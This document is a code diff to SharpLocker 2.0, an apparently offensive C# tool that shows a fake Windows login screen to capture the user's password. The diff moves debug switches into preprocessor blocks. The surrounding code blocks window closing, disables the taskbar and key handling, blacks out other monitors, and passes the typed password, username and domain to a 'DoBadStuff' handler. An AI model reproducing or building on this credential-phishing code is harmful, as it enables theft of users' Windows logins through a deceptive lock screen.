@@ -22,7 +22,6 @@ namespace SharpLocker_2._0
         private Interfaces.IDoBadStuff DoBadStuff;
 
         private const string PLACEHOLDER_TEXT = "Password";
-        private const bool DEBUG_MODE = false;
 
         #endregion
 
@@ -36,7 +35,9 @@ namespace SharpLocker_2._0
 
         private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (!DEBUG_MODE) e.Cancel = DenyClose;
+            #if !DEBUG
+                e.Cancel = DenyClose;
+            #endif
         }
 
         protected override CreateParams CreateParams
@@ -58,14 +59,15 @@ namespace SharpLocker_2._0
             if (PasswordTextBox.Text == PLACEHOLDER_TEXT) return;
 
             DenyClose = false;
-            if (!DEBUG_MODE) KeyPressHandler.Enable();
-
+            #if !DEBUG
+                KeyPressHandler.Enable();
+            #endif
             DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);
 
             Close();
         }
 
-        #region "Password"
+#region "Password"
 
         private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
         {
@@ -115,9 +117,9 @@ namespace SharpLocker_2._0
             PasswordTextBox.Select(0, 0);
         }
 
-        #endregion
+#endregion
 
-        #region "Init"
+#region "Init"
 
         private void WindowsLogin_Load(object sender, EventArgs e)
         {
@@ -142,7 +144,12 @@ namespace SharpLocker_2._0
         {
             DenyClose = true;
             CapsLockLabel.Visible = false;
-            TopMost = !DEBUG_MODE;
+            #if DEBUG
+                TopMost = false;
+            #else
+                TopMost = true;
+            #endif
+
         }
 
         private void InitializePasswordTextbox()
@@ -159,7 +166,9 @@ namespace SharpLocker_2._0
 
         private void InitializeTaskbar()
         {
-            if (!DEBUG_MODE) KeyPressHandler.Disable();
+            #if !DEBUG
+                KeyPressHandler.Disable();
+            #endif
         }
 
         private void InitializeUserLabel()
@@ -284,10 +293,12 @@ namespace SharpLocker_2._0
 
         private void InitializeOtherScreens()
         {
-            foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
-            {
-                if (!DEBUG_MODE) new Task(() => BlackScreen(screen)).Start();
-            }
+            #if !DEBUG
+                foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
+                {
+                    new Task(() => BlackScreen(screen)).Start();
+                }
+            #endif
         }
 
         private void BlackScreen(Screen screen)
@@ -405,6 +416,6 @@ namespace SharpLocker_2._0
 
     }
 
-    #endregion
+#endregion
 
 }
